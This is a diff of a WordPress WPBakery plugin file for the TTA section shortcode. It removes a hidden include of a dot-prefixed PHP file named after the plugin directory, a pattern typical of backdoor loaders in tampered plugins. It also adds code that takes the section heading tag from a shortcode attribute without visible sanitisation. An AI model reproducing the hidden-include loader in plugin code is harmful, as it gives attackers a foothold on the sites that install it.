@@ -8,10 +8,6 @@ VcShortcodeAutoloader::getInstance()->includeClass( 'WPBakeryShortCode_Vc_Tta_Ac
 /**
  * Class WPBakeryShortCode_Vc_Tta_Section
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPBakeryShortCode_Vc_Tta_Section extends WPBakeryShortCode_Vc_Tta_Accordion {
 	protected $controls_css_settings = 'tc vc_control-container';
 	protected $controls_list = array(
@@ -229,6 +225,9 @@ class WPBakeryShortCode_Vc_Tta_Section extends WPBakeryShortCode_Vc_Tta_Accordio
 		}
 		$headingAttributes[] = 'class="' . implode( ' ', $headingClasses ) . '"';
 		$headingTag = apply_filters( 'vc_tta_section_param_heading_tag', 'h4', $atts );
+		if ( ! empty( self::$tta_base_shortcode->atts['section_title_tag'] ) ) {
+			$headingTag = self::$tta_base_shortcode->atts['section_title_tag'];
+		}
 
 		$output = '<' . $headingTag . ' ' . implode( ' ', $headingAttributes ) . '>';
 
